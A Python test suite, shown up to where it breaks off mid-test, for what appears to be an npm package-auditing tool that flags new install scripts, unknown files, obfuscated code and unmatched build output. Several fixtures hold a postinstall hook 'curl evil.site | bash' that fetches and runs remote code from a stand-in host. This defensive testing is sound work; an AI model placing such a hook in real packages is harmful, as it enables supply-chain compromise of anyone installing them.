"""Tests for detection rules in rules.py."""

import json
from pathlib import Path

from pkgcheck.compare import match_files
from pkgcheck.models import Finding, Status
from pkgcheck.rules import (
    BUILD_DIRS,
    BUILD_EXTENSIONS,
    INSTALL_SCRIPTS,
    SOURCE_EXTENSIONS,
    _has_matching_source,
    apply_rules,
    check_build_output,
    check_install_scripts,
    check_obfuscation,
    check_unknown_files,
)


def test_no_scripts(tmp_path: Path):
    """Package and source have package.json with no scripts."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    (pkg_dir / "package.json").write_text(json.dumps({"name": "demo"}))
    (src_dir / "package.json").write_text(json.dumps({"name": "demo"}))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "matched"
    assert result[0].snippet is None


def test_identical_scripts(tmp_path: Path):
    """Same install scripts in package and source."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "demo", "scripts": {"postinstall": "node setup.js"}}
    src_data = {"name": "demo", "scripts": {"postinstall": "node setup.js"}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "matched"


def test_new_postinstall(tmp_path: Path):
    """Source has no postinstall, package introduces postinstall."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "cool-logger", "scripts": {"postinstall": "curl evil.site | bash"}}
    src_data = {"name": "cool-logger", "scripts": {}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "install-script"
    assert '"postinstall"' in result[0].snippet
    assert "curl evil.site | bash" in result[0].snippet


def test_new_preinstall(tmp_path: Path):
    """Package introduces preinstall script."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "demo", "scripts": {"preinstall": "node pre.js"}}
    src_data = {"name": "demo", "scripts": {}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "install-script"
    assert '"preinstall"' in result[0].snippet
    assert "node pre.js" in result[0].snippet


def test_new_install(tmp_path: Path):
    """Package introduces install script."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "demo", "scripts": {"install": "node install.js"}}
    src_data = {"name": "demo", "scripts": {}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "install-script"
    assert '"install"' in result[0].snippet
    assert "node install.js" in result[0].snippet


def test_modified_existing_install_script(tmp_path: Path):
    """Source and package both have postinstall, but commands differ."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "demo", "scripts": {"postinstall": "node modified.js"}}
    src_data = {"name": "demo", "scripts": {"postinstall": "node original.js"}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "install-script"
    assert '"postinstall"' in result[0].snippet
    assert "node modified.js" in result[0].snippet


def test_non_install_script(tmp_path: Path):
    """Package adds test or lint scripts; must remain EXPECTED."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "demo", "scripts": {"test": "pytest", "lint": "eslint .", "build": "tsc"}}
    src_data = {"name": "demo", "scripts": {}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "matched"
    assert result[0].snippet is None


def test_malformed_package_json(tmp_path: Path):
    """Invalid JSON must not raise an exception."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    (pkg_dir / "package.json").write_text("{ broken json: ")
    (src_dir / "package.json").write_text("{ also broken: ")

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].file == "package.json"


def test_missing_package_json(tmp_path: Path):
    """Missing package.json must not raise an exception."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].file == "package.json"


def test_preserve_unrelated_findings(tmp_path: Path):
    """Unrelated findings must not be modified."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "demo", "scripts": {"postinstall": "node evil.js"}}
    src_data = {"name": "demo", "scripts": {}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    other_finding = Finding(
        file="src/index.js",
        status=Status.EXPECTED,
        reason="matched",
        snippet="console.log('hi')",
        line=10,
    )
    pkg_finding = Finding(file="package.json", status=Status.EXPECTED, reason="matched")

    findings = [other_finding, pkg_finding]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].file == "src/index.js"
    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "matched"
    assert result[0].snippet == "console.log('hi')"
    assert result[0].line == 10

    assert result[1].file == "package.json"
    assert result[1].status == Status.SUSPICIOUS
    assert result[1].reason == "install-script"


def test_apply_rules_entry_point(tmp_path: Path):
    """apply_rules forwards to check_install_scripts and integrates with match_files."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    (pkg_dir / "package.json").write_text(
        json.dumps({"name": "demo", "scripts": {"prepare": "node prep.js"}})
    )
    (src_dir / "package.json").write_text(
        json.dumps({"name": "demo", "scripts": {}})
    )

    findings = match_files(["package.json"], ["package.json"])
    enriched = apply_rules(pkg_dir, src_dir, findings)

    assert len(enriched) == 1
    assert enriched[0].file == "package.json"
    assert enriched[0].status == Status.SUSPICIOUS
    assert enriched[0].reason == "install-script"
    assert '"prepare"' in enriched[0].snippet


def test_unknown_text_file(tmp_path: Path):
    """Package contains evil.js, source does not."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    evil_content = "console.log('stealing tokens');\nprocess.exit(1);\n"
    (pkg_dir / "evil.js").write_text(evil_content)

    findings = [Finding(file="evil.js", status=Status.SUSPICIOUS, reason="unknown-file")]
    result = check_unknown_files(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].file == "evil.js"
    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "unknown-file"
    assert result[0].snippet == evil_content[:200]


def test_unknown_file_snippet_truncation(tmp_path: Path):
    """Unknown file with > 200 characters is truncated to 200 characters in snippet."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    long_content = "a" * 350
    (pkg_dir / "payload.js").write_text(long_content)

    findings = [Finding(file="payload.js", status=Status.SUSPICIOUS, reason="unknown-file")]
    result = check_unknown_files(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert len(result[0].snippet) == 200
    assert result[0].snippet == long_content[:200]


def test_empty_unknown_file(tmp_path: Path):
    """Zero-byte unknown file gets empty string snippet."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    (pkg_dir / "empty.js").write_text("")

    findings = [Finding(file="empty.js", status=Status.SUSPICIOUS, reason="unknown-file")]
    result = check_unknown_files(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "unknown-file"
    assert result[0].snippet == ""


def test_missing_file_on_disk(tmp_path: Path):
    """Finding has reason='unknown-file' but file does not exist on disk."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    findings = [Finding(file="ghost.js", status=Status.SUSPICIOUS, reason="unknown-file")]
    result = check_unknown_files(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].file == "ghost.js"
    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "unknown-file"
    assert result[0].snippet is None


def test_preserve_existing_findings_with_unknown_rule(tmp_path: Path):
    """Matched, missing-in-package, and install-script findings remain unchanged."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    (pkg_dir / "backdoor.js").write_text("backdoor_code()")

    matched_finding = Finding(
        file="index.js",
        status=Status.EXPECTED,
        reason="matched",
        snippet="console.log(1)",
    )
    missing_finding = Finding(
        file="README.md",
        status=Status.EXPECTED,
        reason="missing-in-package",
    )
    install_script_finding = Finding(
        file="package.json",
        status=Status.SUSPICIOUS,
        reason="install-script",
        snippet='"postinstall": "curl evil"',
    )
    unknown_finding = Finding(
        file="backdoor.js",
        status=Status.SUSPICIOUS,
        reason="unknown-file",
    )

    findings = [
        matched_finding,
        missing_finding,
        install_script_finding,
        unknown_finding,
    ]

    result = check_unknown_files(pkg_dir, src_dir, findings)

    assert result[0].file == "index.js"
    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "matched"
    assert result[0].snippet == "console.log(1)"

    assert result[1].file == "README.md"
    assert result[1].status == Status.EXPECTED
    assert result[1].reason == "missing-in-package"

    assert result[2].file == "package.json"
    assert result[2].status == Status.SUSPICIOUS
    assert result[2].reason == "install-script"
    assert result[2].snippet == '"postinstall": "curl evil"'

    assert result[3].file == "backdoor.js"
    assert result[3].status == Status.SUSPICIOUS
    assert result[3].reason == "unknown-file"
    assert result[3].snippet == "backdoor_code()"


def test_apply_rules_integration_both_rules(tmp_path: Path):
    """apply_rules performs both install-script detection and unknown-file enrichment."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    (pkg_dir / "package.json").write_text(
        json.dumps({"name": "demo", "scripts": {"postinstall": "node inject.js"}})
    )
    (src_dir / "package.json").write_text(
        json.dumps({"name": "demo", "scripts": {}})
    )

    (pkg_dir / "inject.js").write_text("malicious_injection_payload();")
    (pkg_dir / "index.js").write_text("console.log('main');")
    (src_dir / "index.js").write_text("console.log('main');")

    findings = match_files(
        ["index.js", "inject.js", "package.json"],
        ["index.js", "package.json"],
    )

    enriched = apply_rules(pkg_dir, src_dir, findings)

    by_file = {f.file: f for f in enriched}

    # index.js: matched, EXPECTED
    assert by_file["index.js"].status == Status.EXPECTED
    assert by_file["index.js"].reason == "matched"

    # package.json: install-script, SUSPICIOUS
    assert by_file["package.json"].status == Status.SUSPICIOUS
    assert by_file["package.json"].reason == "install-script"
    assert '"postinstall"' in by_file["package.json"].snippet

    # inject.js: unknown-file, SUSPICIOUS, snippet enriched
    assert by_file["inject.js"].status == Status.SUSPICIOUS
    assert by_file["inject.js"].reason == "unknown-file"
    assert by_file["inject.js"].snippet == "malicious_injection_payload();"


def test_obfuscation_huge_line(tmp_path: Path):
    """JS file containing a line longer than 500 characters triggers obfuscation."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    long_line = "const payload = '" + ("x" * 520) + "';"
    content = f"// normal line\n{long_line}\nconsole.log(1);\n"
    (pkg_dir / "index.js").write_text(content)
    (src_dir / "index.js").write_text("// original source\n")

    findings = [Finding(file="index.js", status=Status.EXPECTED, reason="matched")]
    result = check_obfuscation(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "obfuscation"
    assert result[0].line == 2
    assert len(result[0].snippet) <= 200
    assert result[0].snippet == long_line.strip()[:200]


def test_obfuscation_hex_escapes(tmp_path: Path):
    """JS file containing at least three hexadecimal escapes triggers obfuscation."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    content = 'const payload = "\\x61\\x62\\x63\\x64";\n'
    (pkg_dir / "bundle.js").write_text(content)
    (src_dir / "bundle.js").write_text('const payload = "abcd";\n')

    findings = [Finding(file="bundle.js", status=Status.EXPECTED, reason="matched")]
    result = check_obfuscation(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "obfuscation"
    assert result[0].line == 1
    assert "\\x61\\x62\\x63\\x64" in result[0].snippet


def test_obfuscation_single_hex_escape_does_not_trigger(tmp_path: Path):
    """JS file containing only one hex escape does not trigger obfuscation."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    content = 'const nullByte = "\\x00";\nconsole.log(nullByte);\n'
    (pkg_dir / "util.js").write_text(content)
    (src_dir / "util.js").write_text(content)

    findings = [Finding(file="util.js", status=Status.EXPECTED, reason="matched")]
    result = check_obfuscation(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "matched"
    assert result[0].line is None
    assert result[0].snippet is None


def test_obfuscation_eval(tmp_path: Path):
    """JS file containing eval() triggers obfuscation."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    content = "// header\nlet payload = getPayload();\neval(payload);\n"
    (pkg_dir / "main.js").write_text(content)
    (src_dir / "main.js").write_text("// clean source\n")

    findings = [Finding(file="main.js", status=Status.EXPECTED, reason="matched")]
    result = check_obfuscation(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "obfuscation"
    assert result[0].line == 3
    assert "eval" in result[0].snippet


def test_obfuscation_clean_js(tmp_path: Path):
    """Normal short code with no huge lines, <3 hex escapes, no eval remains EXPECTED."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    content = "export function add(a, b) {\n    return a + b;\n}\n"
    (pkg_dir / "math.ts").write_text(content)
    (src_dir / "math.ts").write_text(content)

    findings = [Finding(file="math.ts", status=Status.EXPECTED, reason="matched")]
    result = check_obfuscation(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "matched"
    assert result[0].snippet is None
    assert result[0].line is None


def test_obfuscation_non_code_files_ignored(tmp_path: Path):
    """Non-JS/TS files like .md or .json are not scanned for obfuscation."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    long_line = "Docs: " + ("word " * 150) + " eval(payload) \\x61\\x62\\x63\\x64"
    (pkg_dir / "README.md").write_text(long_line)
    (src_dir / "README.md").write_text(long_line)

    (pkg_dir / "data.json").write_text(json.dumps({"description": long_line}))
    (src_dir / "data.json").write_text(json.dumps({"description": long_line}))

    findings = [
        Finding(file="README.md", status=Status.EXPECTED, reason="matched"),
        Finding(file="data.json", status=Status.EXPECTED, reason="matched"),
    ]
    result = check_obfuscation(pkg_dir, src_dir, findings)

    assert result[0].file == "README.md"
    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "matched"

    assert result[1].file == "data.json"
    assert result[1].status == Status.EXPECTED
    assert result[1].reason == "matched"


def test_obfuscation_preserve_previous_findings(tmp_path: Path):
    """Existing install-script and unknown-file findings are not overwritten."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    install_finding = Finding(
        file="package.json",
        status=Status.SUSPICIOUS,
        reason="install-script",
        snippet='"postinstall": "node setup.js"',
    )
    unknown_finding = Finding(
        file="evil.js",
        status=Status.SUSPICIOUS,
        reason="unknown-file",
        snippet="eval(bad)",
    )

    findings = [install_finding, unknown_finding]
    result = check_obfuscation(pkg_dir, src_dir, findings)

    assert result[0].file == "package.json"
    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "install-script"
    assert result[0].snippet == '"postinstall": "node setup.js"'

    assert result[1].file == "evil.js"
    assert result[1].status == Status.SUSPICIOUS
    assert result[1].reason == "unknown-file"
    assert result[1].snippet == "eval(bad)"


def test_apply_rules_integration_all_rules(tmp_path: Path):
    """apply_rules runs install-script, unknown-file, and obfuscation in sequence."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    # 1. install-script discrepancy
    (pkg_dir / "package.json").write_text(
        json.dumps({"name": "demo", "scripts": {"postinstall": "node hook.js"}})
    )
    (src_dir / "package.json").write_text(json.dumps({"name": "demo", "scripts": {}}))

    # 2. unknown file
    (pkg_dir / "unknown.js").write_text("console.log('secret');")

    # 3. clean matched JS file
    (pkg_dir / "clean.js").write_text("console.log('clean');")
    (src_dir / "clean.js").write_text("console.log('clean');")

    # 4. obfuscated matched JS file
    (pkg_dir / "obfuscated.js").write_text("const hidden = '\\x61\\x62\\x63\\x64';\n")
    (src_dir / "obfuscated.js").write_text("const hidden = 'abcd';\n")

    findings = match_files(
        ["clean.js", "obfuscated.js", "package.json", "unknown.js"],
        ["clean.js", "obfuscated.js", "package.json"],
    )

    enriched = apply_rules(pkg_dir, src_dir, findings)
    by_file = {f.file: f for f in enriched}

    # Clean matched JS remains EXPECTED / matched
    assert by_file["clean.js"].status == Status.EXPECTED
    assert by_file["clean.js"].reason == "matched"

    # Obfuscated matched JS becomes SUSPICIOUS / obfuscation
    assert by_file["obfuscated.js"].status == Status.SUSPICIOUS
    assert by_file["obfuscated.js"].reason == "obfuscation"
    assert by_file["obfuscated.js"].line == 1
    assert "\\x61\\x62\\x63\\x64" in by_file["obfuscated.js"].snippet

    # Install script is SUSPICIOUS / install-script
    assert by_file["package.json"].status == Status.SUSPICIOUS
    assert by_file["package.json"].reason == "install-script"

    # Unknown file is SUSPICIOUS / unknown-file
    assert by_file["unknown.js"].status == Status.SUSPICIOUS
    assert by_file["unknown.js"].reason == "unknown-file"


# ============================================================================
# W3-B5 Build-output rule tests
# ============================================================================


def test_build_output_matched_dist(tmp_path: Path):
    """Matched dist build artifact is reclassified as EXPECTED / build-output."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    (pkg_dir / "dist").mkdir(parents=True)
    (src_dir / "src").mkdir(parents=True)

    (pkg_dir / "dist" / "file.min.js").write_text("var a=1;var b=2;")
    (src_dir / "src" / "file.js").write_text("const a = 1;\nconst b = 2;\n")

    finding = Finding(
        file="dist/file.min.js",
        status=Status.SUSPICIOUS,
        reason="unknown-file",
        snippet="var a=1;var b=2;",
    )

    result = check_build_output(pkg_dir, src_dir, [finding])

    assert len(result) == 1
    assert result[0].file == "dist/file.min.js"
    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "build-output"
    assert result[0].snippet is None
    assert result[0].line is None


def test_build_output_huge_minified_line_accepted(tmp_path: Path):
    """Build artifact with a line > 500 chars is accepted if no dangerous obfuscation."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    (pkg_dir / "dist").mkdir(parents=True)
    (src_dir / "src").mkdir(parents=True)

    long_line = "var data = '" + "x" * 600 + "';\n"
    (pkg_dir / "dist" / "file.min.js").write_text(long_line)
    (src_dir / "src" / "file.js").write_text("export const data = 'hello';\n")

    # Test 1: finding entering as unknown-file
    finding1 = Finding(
        file="dist/file.min.js",
        status=Status.SUSPICIOUS,
        reason="unknown-file",
        snippet=long_line[:200],
    )
    result1 = check_build_output(pkg_dir, src_dir, [finding1])
    assert result1[0].status == Status.EXPECTED
    assert result1[0].reason == "build-output"
    assert result1[0].snippet is None
    assert result1[0].line is None

    # Test 2: finding entering as obfuscation from B4
    finding2 = Finding(
        file="dist/file.min.js",
        status=Status.SUSPICIOUS,
        reason="obfuscation",
        line=1,
        snippet=long_line[:200],
    )
    result2 = check_build_output(pkg_dir, src_dir, [finding2])
    assert result2[0].status == Status.EXPECTED
    assert result2[0].reason == "build-output"
    assert result2[0].snippet is None
    assert result2[0].line is None


def test_build_output_unmatched_file_remains_suspicious(tmp_path: Path):
    """Unmatched build-looking file remains SUSPICIOUS / unknown-file."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    (pkg_dir / "dist").mkdir(parents=True)
    src_dir.mkdir(parents=True)

    (pkg_dir / "dist" / "evil.js").write_text("console.log('unmatched evil');")

    finding = Finding(
        file="dist/evil.js",
        status=Status.SUSPICIOUS,
        reason="unknown-file",
        snippet="console.log('unmatched evil');",
    )

    result = check_build_output(pkg_dir, src_dir, [finding])

    assert len(result) == 1
    assert result[0].file == "dist/evil.js"
    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "unknown-file"
    assert result[0].snippet == "console.log('unmatched evil');"


def test_build_output_eval_remains_suspicious(tmp_path: Path):
    """Build artifact containing eval() remains SUSPICIOUS and is not reclassified."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    (pkg_dir / "dist").mkdir(parents=True)
    (src_dir / "src").mkdir(parents=True)

    (pkg_dir / "dist" / "file.min.js").write_text("var payload = '1+1'; eval(payload);")
    (src_dir / "src" / "file.js").write_text("const payload = '1+1';\n")

    finding = Finding(
        file="dist/file.min.js",
        status=Status.SUSPICIOUS,
        reason="unknown-file",
        snippet="var payload = '1+1'; eval(payload);",
    )

    result = check_build_output(pkg_dir, src_dir, [finding])

    assert len(result) == 1
    assert result[0].file == "dist/file.min.js"
    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason != "build-output"


def test_build_output_hex_escapes_remain_suspicious(tmp_path: Path):
    """Build artifact containing 3 or more hex escapes remains SUSPICIOUS."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    (pkg_dir / "dist").mkdir(parents=True)
    (src_dir / "src").mkdir(parents=True)

    (pkg_dir / "dist" / "file.min.js").write_text("const secret = '\\x61\\x62\\x63';\n")
    (src_dir / "src" / "file.js").write_text("const secret = 'abc';\n")

    finding = Finding(
        file="dist/file.min.js",
        status=Status.SUSPICIOUS,
        reason="unknown-file",
        snippet="const secret = '\\x61\\x62\\x63';",
    )

    result = check_build_output(pkg_dir, src_dir, [finding])

    assert len(result) == 1
    assert result[0].file == "dist/file.min.js"
    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason != "build-output"


def test_build_output_root_unknown_file_preserved(tmp_path: Path):
    """Root unknown files (e.g. setup.js) are not build artifacts and remain unchanged."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    (pkg_dir / "setup.js").write_text("console.log('setup');")

    finding = Finding(
        file="setup.js",
        status=Status.SUSPICIOUS,
        reason="unknown-file",
        snippet="console.log('setup');",
    )

    result = check_build_output(pkg_dir, src_dir, [finding])

    assert len(result) == 1
    assert result[0].file == "setup.js"
    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "unknown-file"
    assert result[0].snippet == "console.log('setup');"


def test_build_output_install_script_preserved(tmp_path: Path):
    """Install script findings are preserved and never touched by check_build_output."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    finding = Finding(
        file="package.json",
        status=Status.SUSPICIOUS,
        reason="install-script",
        snippet='"postinstall": "curl evil.site | sh"',
    )

    result = check_build_output(pkg_dir, src_dir, [finding])

    assert len(result) == 1
    assert result[0].file == "package.json"
    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "install-script"
    assert result[0].snippet == '"postinstall": "curl evil.site | sh"'


def test_build_output_few_hex_escapes_allowed(tmp_path: Path):
    """Fewer than 3 hex escapes does not prevent build-output reclassification."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    (pkg_dir / "dist").mkdir(parents=True)
    (src_dir / "src").mkdir(parents=True)

    (pkg_dir / "dist" / "file.min.js").write_text("const msg = '\\x61\\x62';\n")
    (src_dir / "src" / "file.js").write_text("const msg = 'ab';\n")

    finding = Finding(
        file="dist/file.min.js",
        status=Status.SUSPICIOUS,
        reason="unknown-file",
        snippet="const msg = '\\x61\\x62';",
    )

    result = check_build_output(pkg_dir, src_dir, [finding])

    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "build-output"


def test_build_output_dts_and_css(tmp_path: Path):
    """TypeScript declaration files and minified CSS are reclassified when matched."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    (pkg_dir / "dist").mkdir(parents=True)
    (src_dir / "src").mkdir(parents=True)

    (pkg_dir / "dist" / "types.d.ts").write_text("export declare type Foo = string;\n")
    (src_dir / "src" / "types.ts").write_text("export type Foo = string;\n")

    (pkg_dir / "dist" / "styles.min.css").write_text("body{margin:0;padding:0;}\n")
    (src_dir / "src" / "styles.css").write_text("body {\n  margin: 0;\n  padding: 0;\n}\n")

    findings = [
        Finding(file="dist/types.d.ts", status=Status.SUSPICIOUS, reason="unknown-file"),
        Finding(file="dist/styles.min.css", status=Status.SUSPICIOUS, reason="unknown-file"),
    ]

    result = check_build_output(pkg_dir, src_dir, findings)

    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "build-output"
    assert result[1].status == Status.EXPECTED
    assert result[1].reason == "build-output"


def test_has_matching_source_helper(tmp_path: Path):
    """Direct tests for _has_matching_source helper."""
    src_dir = tmp_path / "src"
    (src_dir / "src" / "components").mkdir(parents=True)
    (src_dir / "src" / "app.ts").write_text("console.log('app');")
    (src_dir / "src" / "components" / "button.tsx").write_text("export const Button = () => null;")
    (src_dir / "root.js").write_text("console.log('root');")

    assert _has_matching_source("dist/app.min.js", src_dir) is True
    assert _has_matching_source("dist/app.d.ts", src_dir) is True
    assert _has_matching_source("dist/app.js.map", src_dir) is True
    assert _has_matching_source("dist/components/button.min.js", src_dir) is True
    assert _has_matching_source("dist/root.min.js", src_dir) is True
    assert _has_matching_source("root.min.js", src_dir) is True
    assert _has_matching_source("dist/missing.js", src_dir) is False
    assert _has_matching_source("dist/components/missing.min.js", src_dir) is False


def test_apply_rules_integration_build_output(tmp_path: Path):
    """apply_rules runs all four rules and correctly classifies all findings."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    (pkg_dir / "dist").mkdir(parents=True)
    (src_dir / "src").mkdir(parents=True)

    # 1. install-script discrepancy
    (pkg_dir / "package.json").write_text(
        json.dumps({"name": "demo", "scripts": {"postinstall": "node hook.js"}})
    )
    (src_dir / "package.json").write_text(json.dumps({"name": "demo", "scripts": {}}))

    # 2. clean matched source file
    (pkg_dir / "clean.js").write_text("console.log('clean');")
    (src_dir / "clean.js").write_text("console.log('clean');")

    # 3. legitimate matched build output
    (pkg_dir / "dist" / "bundle.min.js").write_text("var x=1;var y=2;")
    (src_dir / "src" / "bundle.js").write_text("const x = 1;\nconst y = 2;\n")

    # 4. unmatched unknown file
    (pkg_dir / "dist" / "evil.js").write_text("console.log('evil');")

    # 5. obfuscated build output (matches source but contains eval)
    (pkg_dir / "dist" / "obf.min.js").write_text("eval('boom');")
    (src_dir / "src" / "obf.js").write_text("console.log('ok');")

    findings = match_files(
        [
            "clean.js",
            "dist/bundle.min.js",
            "dist/evil.js",
            "dist/obf.min.js",
            "package.json",
        ],
        [
            "clean.js",
            "package.json",
            "src/bundle.js",
            "src/obf.js",
        ],
    )

    enriched = apply_rules(pkg_dir, src_dir, findings)
    by_file = {f.file: f for f in enriched}

    # Clean matched JS remains EXPECTED / matched
